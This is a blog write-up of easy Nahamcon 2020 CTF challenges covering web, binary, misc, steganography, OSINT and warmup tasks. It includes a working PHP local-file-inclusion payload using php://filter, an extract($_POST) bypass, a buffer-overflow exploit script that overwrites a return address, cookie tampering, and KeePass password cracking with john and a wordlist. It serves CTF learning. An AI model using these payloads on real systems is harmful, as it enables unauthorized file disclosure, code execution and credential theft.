---
title: "Nahamcon CTF WriteUp"
date: 2020-06-15T15:34:30-04:00
categories:
  - CTF Writeups
tags:
  - CTF
  - Nahamcon
  - WriteUp
toc: true
toc_label: "Challenges"
toc_sticky: true
---

[Nahamcon CTF](https://ctf.nahamcon.com/) was an online CTF even held on June 12th-13th. Unfortunately I was only able to dedicate a few hours so I focused on the easier challenges.


## Web

### Agent 95


* Clue: They've given you a number, and taken away your name~ 
* Points: 50 
* Solves: 1788

The Web page gives us the following message: 

>You don't look like our agent!
>We will only give our flag to our Agent 95! He is still running an old version of Windows...


I used BurpSuite to change the User agent to `Mozilla/4.0 (compatible; MSIE 4.0; Windows 95)` which I got from [useragentstring.com](http://useragentstring.com/pages/useragentstring.php?name=Internet+Explorer). The response is the flag.

***

### Localghost

* Clue: BooOooOooOOoo! This spooOoOooky client-side cooOoOode sure is scary! What spoOoOoOoky secrets does he have in stooOoOoOore??
* Points: 75
* Solves: 1375

![Ascii Ghost]({{ site.url }}{{ site.baseurl }}/assets/Nahamconctf/localghost.jpg)

The web page has an ascii art ghost, which scrolls infinitely. By looking at the source code we find that the infinite scrolling is done using javascript /jquery.jscroll2.js.

The javascript is obfuscated 

```js
var _0xbcec=["\x75\x73\x65\x20\x73\x74\x72\x69\x63\x74","\x6A\x73\x63\x72\x6F\x6C\x6C","\x3C\x73\x6D\x61\x6C\x6C\x3E\x4C\x6F\x61\x64\x69\x6E\x67\x2E\x2E\x2E\x3C\x2F\x73\x6D\x61\x6C\x6C\x3E","\x61\x3A\x6C\x61\x73\x74","","\x66\x6C\x61\x67","\x53\x6B\x4E\x55\x52\x6E\x74\x7A\x63\x47\x39\x76\x62\x32\x39\x76\x61\x33\x6C\x66\x5A\x32\x68\x76\x63\x33\x52\x7A\x58\x32\x6C\x75\x58\x33\x4E\x30\x62\x33\x4A\x68\x5A\x32\x56\x39","\x73\x65\x74\x49\x74\x65\x6D","\x6C\x6F\x63\x61\x6C\x53\x74\x6F\x72\x61\x67\x65","\x64\x61\x74\x61","\x66\x75\x6E\x63\x74\x69\x6F\x6E","\x64\x65\x66\x61\x75\x6C\x74\x73","\x65\x78\x74\x65\x6E\x64","\x6F\x76\x65\x72\x66\x6C\x6F\x77\x2D\x79","\x63\x73\x73","\x76\x69\x73\x69\x62\x6C\x65","\x66\x69\x72\x73\x74","\x6E\x65\x78\x74\x53\x65\x6C\x65\x63\x74\x6F\x72","\x66\x69\x6E\x64","\x62\x6F\x64\x79","\x68\x72\x65\x66","\x61\x74\x74\x72",
...
```

I used [beautifier.io](https://beautifier.io/) to de-obfuscate the code.

```js
(function(_0xe943x1) {
    'use strict';
    _0xe943x1['jscroll'] = {
        defaults: {
            debug: false,
            autoTrigger: true,
            autoTriggerUntil: false,
            loadingHtml: '<small>Loading...</small>',
            padding: 0,
            nextSelector: 'a:last',
            contentSelector: '',
            pagingSelector: '',
            callback: false
        }
    };
    window['localStorage']['setItem']('flag', atob('SkNURntzcG9vb29va3lfZ2hvc3RzX2luX3N0b3JhZ2V9'));
    var _0xe943x2 = function(_0xe943x3, _0xe943x4) {
        var _0xe943x5 = _0xe943x3['data']('jscroll'),
            _0xe943x6 = (typeof _0xe943x4 === 'function') ? {
                callback: _0xe943x4
            } : _0xe943x4,
            _0xe943x7 = _0xe943x1['extend']({}, _0xe943x1['jscroll']['defaults'], _0xe943x6, _0xe943x5 || {}),
            _0xe943x8 = (_0xe943x3['css']('overflow-y') === 'visible'),
            _0xe943x9 = _0xe943x3['find'](_0xe943x7['nextSelector'])['first'](),
            _0xe943xa = _0xe943x1(window),
            _0xe943xb = _0xe943x1('body'),
            _0xe943xc = _0xe943x8 ? _0xe943xa : _0xe943x3,
            _0xe943xd = _0xe943x1['trim'](_0xe943x9['attr']('href') + ' ' + _0xe943x7['contentSelector']),
            _0xe943xe = function() {
                var _0xe943x17 = _0xe943x1(_0xe943x7['loadingHtml'])['filter']('img')['attr']('src');
                if (_0xe943x17) {
                    var _0xe943x18 = new Image();
                    _0xe943x18['src'] = _0xe943x17
                }
            },

            ...
```

The code sets the item "flag" to the string `SkNURntzcG9vb29va3lfZ2hvc3RzX2luX3N0b3JhZ2V9` if we base64 decode this string we get the flag.

Another way to solve this challenge is to simply use chrome dev tools, where the flag is stored in Local Storage.

![Local Ghost]({{ site.url }}{{ site.baseurl }}/assets/Nahamconctf/localflag.jpg)
{: .full}

***

### PhphoneBook

* Clue: Ring ring! Need to look up a number? This phonebook has got you covered! But you will only get a flag if it is an emergency!
* Points: 100
* Solves: 561

The web page gives us the following:

```
Sorry! You are in /index.php/?file=
The phonebook is located at phphonebook.php
```

I first tried going directly to phphonebook.php and got the following page: 

![phphonebook]({{ site.url }}{{ site.baseurl }}/assets/Nahamconctf/phonebook.jpg)

I then tried going to /index.php/?file=phphonebook.php and got the same page. I realised quickly that it was a local file inclusion, but spent too long trying to look for other files, like a flag.php, which doesn't exist. 

Eventually I realised / remembered that I might be able to get the contents of phphonebook.php by using base64 encoding. 

```
http://jh2i.com:50002/index.php?file=php://filter/convert.base64-encode/resource=phphonebook.php
```

It works! This gives us the contents of phphonebook.php encoded in base64. 

Decoding it gives us the following code:

```php
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>Phphonebook</title>
    <link href="main.css" rel="stylesheet">
  </head>

  <body class="bg">
    <h1 id="header"> Welcome to the Phphonebook </h1>

    <div id="im_container">

      <img src="book.jpg" width="50%" height="30%"/>

      <p class="desc">
      This phphonebook was made to look up all sorts of numbers! Have fun...
      </p>

    </div>
<br>
<br>
    <div>
      <form method="POST" action="#">
        <label id="form_label">Enter number: </label>
        <input type="text" name="number">
        <input type="submit" value="Submit">
      </form>
    </div>

    <div id="php_container">
    <?php
      extract($_POST);

    	if (isset($emergency)){
    		echo(file_get_contents("/flag.txt"));
    	}
    ?>
  </div>
  </br>
  </br>
  </br>
  </body>
</html>
```

From the code we learn that flag.txt will be read if the emergency variable is set, however it doesn't matter what this is set too. 

We can use BurpSuite to add the line `emergency=123` to the body of the POST request to phphonebook.php which will return the flag.

***

## Binary Exploitation

### Dangerous


* Clue: Hey! Listen!
* Points: 75
* Solves: 255

We are given an nc session to join `nc jh2i.com 50011` and a binary to download called dangerous.
When we run dangerous it asks for a name and then prints the name along with an ascii sword

![Its dangerous to go alone]({{ site.url }}{{ site.baseurl }}/assets/Nahamconctf/dangerous.jpg)

First step is to cause a segmentation fault by overflowing the buffer, to this just input a large number of characters, I started with 100 and increased from there. At 500 we get our segmentation fault.

![segfault]({{ site.url }}{{ site.baseurl }}/assets/Nahamconctf/segfault.jpg)

We can use pattern_create and pattern_offset from msf to find the correct input length, which is 497. 

The next step is to identify a vulnerable function. Using Ghidra I found a function at `0x0040130e` which reads ./flag.txt and outputs it.

We can now get the flag with the following: 

```py
#!/usr/bin/python

vulnfunc = '\x0e\x13\x40\x00\x00\x00\x00\x00'
buff = 'A' * 497

print buff + vulnfunc
```

![DangerFlag]({{ site.url }}{{ site.baseurl }}/assets/Nahamconctf/dangerflag.jpg)

***

## Misc

### Vortex

* Clue: Will you find the flag, or get lost in the vortex?
* Points: 75
* Solves: 582

When we connect the output looks like random characters (like cat /dev/urandom).

We can redirect the output to a file then grep for the flag.

```bash
 nc jh2i.com 50017 > vortex.txt
```

```bash
 cat vortex.txt | grep flag

 flag{more_text_in_the_vortex}
 ```

***

### Fake File

* Clue: Wait... where is the flag?
* Points: 100
* Solves: 521

We connect to `nc jh2i.com 50026` We run ls -la to see all files, there seems to be a file named .. 

If we highlight and copy the line then look at it as hex we see the filename contains characters outside the ascii table, the filename in hex is `2e 2e e2 80 80`.

If we simply copy and paste the filename we can use cat:

```bash
user@host:/home/user$ cat .. 
cat .. 
flag{we_should_have_been_worried_about_u2k_not_y2k}
```

***

## Stegonography

### Ksteg

* Clue: This must be a typo.... it was kust one letter away!
* Points: 50
* Solves: 383

We are given an image

![luke]({{ site.url }}{{ site.baseurl }}/assets/Nahamconctf/luke.jpg)

The challenge name and clue suggest we use a common stegonography tool called Jsteg

```bash
go run cmd/jsteg/main.go reveal luke.jpg

flag{yeast_bit_stegonography_oops_another_typo}
```

***

### Doh

* Clue: Doh! Stupid steganography... Note, this flag is not in the usual format.
* Points: 50
* Solves: 516

![Doh!]({{ site.url }}{{ site.baseurl }}/assets/Nahamconctf/doh.jpg)

This time running steghide extract with no password will find flag.txt

```bash
steghide extract -sf doh.jpg
cat flag.txt
JCTF{an_annoyed_grunt}
```

***

## OSINT

### Finsta

* Clue: This time we have a username. Can you track down NahamConTron?
* Points: 50
* Solves: 702

The challenge name suggests Instagram, so I looked up the username and the flag is in the account's bio.

![Insta]({{ site.url }}{{ site.baseurl }}/assets/Nahamconctf/insta.jpg)

***

## Warmup

### CLIsay

* Clue: cowsay is hiding something from us!
* Points: 20
* Solves: 1908

We are given a binary. Running it gives us: 

```
  __________________________________
/ Sorry, I'm not allow to reveal any \
\ secrets...                         /
  ----------------------------------
         \   ^__^ 
          \  (oo)\_______
             (__)\       )\/\
                 ||----w |
                 ||     ||

```

Use strings to find the flag 

```
strings clisay

...
flag{Y0u_c4n_
  __________________________________
/ Sorry, I'm not allow to reveal any \
\ secrets...                         /
  ----------------------------------
         \   ^__^ 
          \  (oo)\_______
             (__)\       )\/\
                 ||----w |
                 ||     ||
r3Ad_M1nd5}
...
```

Note: Using grep will only find the first half of the flag

***

### Metameme

* Clue: Hacker memes. So meta.
* Points: 25
* Solves: 2019

![HackerMeme]({{ site.url }}{{ site.baseurl }}/assets/Nahamconctf/hackermeme.jpg)

Running strings on the image will give us the flag 

```bash
strings hackermeme.jpg | grep flag
    <rdf:li>flag{N0t_7h3_4cTuaL_Cr3At0r}</rdf:li>
```

***

### Mr. Robot

* Clue: Elliot needs your help. You know what to do.
* Points: 25
* Solves: 1581

[jh2i.com:50032](http://jh2i.com:50032/) A static webpage. The flag is in robots.txt 
[http://jh2i.com:50032/robots.txt](http://jh2i.com:50032/robots.txt)

***

### UGGC

* Clue: Become the admin!
* Points: 30
* Solves: 1310

If we edit the cookie on the page to set user to admin, we get "you are logged in as nqzva." This is the rot 13 of admin, so setting the cookie to nqzva and refreshing will give us the flag.

![admin]({{ site.url }}{{ site.baseurl }}/assets/Nahamconctf/admin.jpg)

***

### Easy Keesy

* Clue: Dang it, not again...
* Points: 30
* Solves: 670

We are given a keepass database file. We can crack the password using john.

```bash
keepass2john easy_keesy > keehash

john -format:keepass --wordlist=/usr/share/wordlists/rockyou.txt keehash
```
The password is monkey, We can open the database in keepass to get the flag.


*** 


### Pang

I used PCRT to fix the image

```bash
python PCRT.py -i pang.png -o pong.png
```
![pong]({{ site.url }}{{ site.baseurl }}/assets/Nahamconctf/pong.png)



